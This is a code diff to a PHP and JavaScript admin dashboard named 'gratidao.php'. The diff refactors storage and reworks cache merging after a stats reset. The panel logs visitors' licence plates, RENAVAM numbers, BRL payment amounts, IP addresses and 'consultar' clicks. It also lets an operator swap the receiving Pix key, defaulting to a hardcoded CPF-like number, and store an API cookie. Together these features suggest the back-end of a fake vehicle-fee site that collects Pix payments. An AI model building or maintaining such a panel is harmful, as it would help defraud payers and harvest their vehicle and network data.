@@ -2,6 +2,8 @@
 require_once __DIR__ . '/app_storage.php';
 require_once __DIR__ . '/app_auth.php';
 header('Content-Type: text/html; charset=UTF-8');
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
 date_default_timezone_set('America/Sao_Paulo');
 
 // --- AUTHENTICATION ---
@@ -19,14 +21,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
         
         // Registrar IP do administrador
         $adminIpsFile = app_storage_path('admin_ips.json');
-        $adminIps = [];
-        if (file_exists($adminIpsFile)) {
-            $adminIps = json_decode(file_get_contents($adminIpsFile), true) ?: [];
-        }
+        $adminIps = app_list_read('admin_ips.json');
         $currentIp = $_SERVER['REMOTE_ADDR'];
         if (!in_array($currentIp, $adminIps)) {
             $adminIps[] = $currentIp;
-            file_put_contents($adminIpsFile, json_encode($adminIps, JSON_PRETTY_PRINT));
+            app_list_write('admin_ips.json', $adminIps);
         }
 
         header('Location: gratidao.php');
@@ -92,10 +91,10 @@ $msg = isset($_GET['msg']) ? (string)$_GET['msg'] : '';
 // --- ACTIONS ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['reset_stats']) && $_POST['reset_stats'] === '1') {
-        @file_put_contents($pixLogPath, json_encode([], JSON_PRETTY_PRINT));
-        @file_put_contents($searchLogPath, json_encode([], JSON_PRETTY_PRINT));
-        @file_put_contents($clickStatsPath, json_encode(['consultar_clicks'=>0,'enter_clicks'=>0], JSON_PRETTY_PRINT));
-        @file_put_contents(app_storage_path('pix_last.json'), json_encode([], JSON_PRETTY_PRINT));
+        app_list_write('pix_log.json', []);
+        app_list_write('search_log.json', []);
+        app_click_stats_reset();
+        app_list_write('pix_last.json', []);
         header('Location: gratidao.php?msg=' . urlencode('Todos os logs e estatísticas foram limpos.'));
         exit;
     } elseif (isset($_POST['pixKey'])) {
@@ -103,8 +102,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $apiCookie = isset($_POST['apiCookie']) ? trim((string)$_POST['apiCookie']) : '';
         
         if ($pixKey !== '') {
-            $cfg = ['pixKey' => $pixKey, 'apiCookie' => $apiCookie];
-            @file_put_contents($cfgPath, json_encode($cfg, JSON_PRETTY_PRINT));
+            app_config_write('pix_config.json', $pixKey, $apiCookie);
             header('Location: gratidao.php?msg=' . urlencode('Configurações atualizadas com sucesso.'));
             exit;
         } else {
@@ -117,38 +115,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 // --- DATA LOADING ---
 $currentKey = '06721661195';
 $currentCookie = '';
-if (file_exists($cfgPath)) {
-    $cfg = json_decode(@file_get_contents($cfgPath), true);
-    if (isset($cfg['pixKey']) && $cfg['pixKey'] !== '') {
-        $currentKey = $cfg['pixKey'];
-    }
-    if (isset($cfg['apiCookie'])) {
-        $currentCookie = $cfg['apiCookie'];
-    }
+$cfg = app_config_read('pix_config.json');
+if ($cfg['pixKey'] !== '') {
+    $currentKey = $cfg['pixKey'];
+}
+if ($cfg['apiCookie'] !== '') {
+    $currentCookie = $cfg['apiCookie'];
 }
 
-$pixEntries = [];
-if (file_exists($pixLogPath)) {
-    $pixEntries = json_decode(@file_get_contents($pixLogPath), true) ?? [];
-    // Sort by date desc
-    usort($pixEntries, function($a, $b) {
-        return strtotime($b['ts']) - strtotime($a['ts']);
-    });
-}
+$pixEntries = app_list_read('pix_log.json');
+usort($pixEntries, function($a, $b) {
+    return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
+});
 
-$searchEntries = [];
-if (file_exists($searchLogPath)) {
-    $searchEntries = json_decode(@file_get_contents($searchLogPath), true) ?? [];
-    // Sort by date desc
-    usort($searchEntries, function($a, $b) {
-        return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
-    });
-}
+$searchEntries = app_list_read('search_log.json');
+usort($searchEntries, function($a, $b) {
+    return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
+});
 
-$clickStats = ['consultar_clicks' => 0, 'enter_clicks' => 0];
-if (file_exists($clickStatsPath)) {
-    $clickStats = json_decode(@file_get_contents($clickStatsPath), true) ?? $clickStats;
-}
+$clickStats = app_click_stats_read();
 
 // --- HELPER FUNCTIONS ---
 function parse_ua($ua) {
@@ -217,10 +202,13 @@ $totalUniqueVisitors = count($uniqueIps);
 $dashboardState = [
     'currentKey' => $currentKey,
     'currentCookie' => $currentCookie,
+    'configUpdatedAt' => $cfg['updated_at'],
     'defaultPixKey' => '06721661195',
     'pixEntries' => array_values($pixEntries),
     'searchEntries' => array_values($searchEntries),
     'clickStats' => $clickStats,
+    'statsResetAt' => $clickStats['reset_at'],
+    'statsUpdatedAt' => $clickStats['updated_at'],
     'message' => $msg,
 ];
 
@@ -552,8 +540,14 @@ function normalizeArray(value) {
 function normalizeClickStats(value) {
     return {
         consultar_clicks: Number(value && value.consultar_clicks ? value.consultar_clicks : 0),
-        enter_clicks: Number(value && value.enter_clicks ? value.enter_clicks : 0)
+        enter_clicks: Number(value && value.enter_clicks ? value.enter_clicks : 0),
+        updated_at: value && value.updated_at ? String(value.updated_at) : '',
+        reset_at: value && value.reset_at ? String(value.reset_at) : ''
     };
+}
+
+function getTimestampValue(value) {
+    return Date.parse(value || '') || 0;
 }
 
 function uniqueByKey(items, makeKey) {
@@ -585,37 +579,65 @@ function mergeEntries(serverItems, cachedItems, makeKey) {
 
 function mergeDashboardState(serverState, cachedState) {
     const defaultPixKey = serverState.defaultPixKey || '06721661195';
+    const serverResetAt = getTimestampValue(serverState.statsResetAt || (serverState.clickStats && serverState.clickStats.reset_at) || '');
+    const cachedResetAt = getTimestampValue(cachedState && cachedState.statsResetAt ? cachedState.statsResetAt : (cachedState && cachedState.clickStats ? cachedState.clickStats.reset_at : ''));
+    const effectiveResetAt = Math.max(serverResetAt, cachedResetAt);
+    const filterByReset = (items) => normalizeArray(items).filter((item) => {
+        if (!effectiveResetAt) return true;
+        const itemTs = getTimestampValue(item && item.ts ? item.ts : '');
+        return itemTs >= effectiveResetAt;
+    });
     const mergedPixEntries = mergeEntries(
-        serverState.pixEntries,
-        cachedState ? cachedState.pixEntries : [],
+        filterByReset(serverState.pixEntries),
+        filterByReset(cachedState ? cachedState.pixEntries : []),
         (item) => [item.ts || '', item.placa || '', item.renavam || '', item.valor_brl || '', item.ip || ''].join('|')
     );
     const mergedSearchEntries = mergeEntries(
-        serverState.searchEntries,
-        cachedState ? cachedState.searchEntries : [],
+        filterByReset(serverState.searchEntries),
+        filterByReset(cachedState ? cachedState.searchEntries : []),
         (item) => [item.ts || '', item.plate || '', item.renavam || '', item.ip || ''].join('|')
     );
     const serverClicks = normalizeClickStats(serverState.clickStats);
     const cachedClicks = normalizeClickStats(cachedState ? cachedState.clickStats : null);
+    const serverConfigUpdatedAt = getTimestampValue(serverState.configUpdatedAt || '');
+    const cachedConfigUpdatedAt = getTimestampValue(cachedState && cachedState.configUpdatedAt ? cachedState.configUpdatedAt : '');
+    const useServerConfig = serverConfigUpdatedAt >= cachedConfigUpdatedAt;
+    const serverStatsUpdatedAt = getTimestampValue(serverState.statsUpdatedAt || serverClicks.updated_at || '');
+    const cachedStatsUpdatedAt = getTimestampValue(cachedState && cachedState.statsUpdatedAt ? cachedState.statsUpdatedAt : cachedClicks.updated_at);
+    const useServerStats = serverResetAt > cachedResetAt || (serverResetAt === cachedResetAt && serverStatsUpdatedAt >= cachedStatsUpdatedAt);
 
-    const currentKey = serverState.currentKey && (serverState.currentKey !== defaultPixKey || !cachedState || !cachedState.currentKey)
-        ? serverState.currentKey
+    const currentKey = useServerConfig
+        ? (serverState.currentKey || (cachedState && cachedState.currentKey ? cachedState.currentKey : defaultPixKey))
         : (cachedState && cachedState.currentKey ? cachedState.currentKey : serverState.currentKey);
 
-    const currentCookie = serverState.currentCookie
-        ? serverState.currentCookie
-        : (cachedState && cachedState.currentCookie ? cachedState.currentCookie : '');
+    const currentCookie = useServerConfig
+        ? (serverState.currentCookie || (cachedState && cachedState.currentCookie ? cachedState.currentCookie : ''))
+        : (cachedState && cachedState.currentCookie ? cachedState.currentCookie : serverState.currentCookie);
+
+    const clickStats = useServerStats
+        ? {
+            consultar_clicks: serverClicks.consultar_clicks,
+            enter_clicks: serverClicks.enter_clicks,
+            updated_at: serverState.statsUpdatedAt || serverClicks.updated_at || '',
+            reset_at: serverState.statsResetAt || serverClicks.reset_at || ''
+        }
+        : {
+            consultar_clicks: cachedClicks.consultar_clicks,
+            enter_clicks: cachedClicks.enter_clicks,
+            updated_at: cachedState && cachedState.statsUpdatedAt ? cachedState.statsUpdatedAt : cachedClicks.updated_at,
+            reset_at: cachedState && cachedState.statsResetAt ? cachedState.statsResetAt : cachedClicks.reset_at
+        };
 
     return {
         defaultPixKey: defaultPixKey,
         currentKey: currentKey,
         currentCookie: currentCookie,
+        configUpdatedAt: useServerConfig ? (serverState.configUpdatedAt || '') : (cachedState && cachedState.configUpdatedAt ? cachedState.configUpdatedAt : ''),
         pixEntries: mergedPixEntries,
         searchEntries: mergedSearchEntries,
-        clickStats: {
-            consultar_clicks: Math.max(serverClicks.consultar_clicks, cachedClicks.consultar_clicks),
-            enter_clicks: Math.max(serverClicks.enter_clicks, cachedClicks.enter_clicks)
-        },
+        clickStats: clickStats,
+        statsResetAt: clickStats.reset_at || '',
+        statsUpdatedAt: clickStats.updated_at || '',
         message: serverState.message || ''
     };
 }
@@ -836,16 +858,28 @@ if (configForm) {
         const pixKeyInput = document.getElementById('pix-key-input');
         const apiCookieInput = document.getElementById('api-cookie-input');
         const cached = safeParseDashboardState(localStorage.getItem(dashboardStorageKey)) || {};
+        const nowIso = new Date().toISOString();
         cached.currentKey = pixKeyInput ? pixKeyInput.value : '';
         cached.currentCookie = apiCookieInput ? apiCookieInput.value : '';
         cached.defaultPixKey = serverDashboardState.defaultPixKey || '06721661195';
+        cached.configUpdatedAt = nowIso;
         localStorage.setItem(dashboardStorageKey, JSON.stringify(cached));
     });
 }
 
 if (serverDashboardState.message && /limpos/i.test(serverDashboardState.message)) {
     clearDashboardCache();
-    applyDashboardState(serverDashboardState);
+    const resetState = Object.assign({}, serverDashboardState, {
+        pixEntries: [],
+        searchEntries: [],
+        clickStats: normalizeClickStats(serverDashboardState.clickStats),
+        statsResetAt: serverDashboardState.statsResetAt || (serverDashboardState.clickStats && serverDashboardState.clickStats.reset_at) || new Date().toISOString(),
+        statsUpdatedAt: serverDashboardState.statsUpdatedAt || (serverDashboardState.clickStats && serverDashboardState.clickStats.updated_at) || new Date().toISOString()
+    });
+    resetState.clickStats.reset_at = resetState.statsResetAt;
+    resetState.clickStats.updated_at = resetState.statsUpdatedAt;
+    applyDashboardState(resetState);
+    localStorage.setItem(dashboardStorageKey, JSON.stringify(resetState));
 } else {
     const cachedDashboardState = safeParseDashboardState(localStorage.getItem(dashboardStorageKey));
     const mergedDashboardState = mergeDashboardState(serverDashboardState, cachedDashboardState);
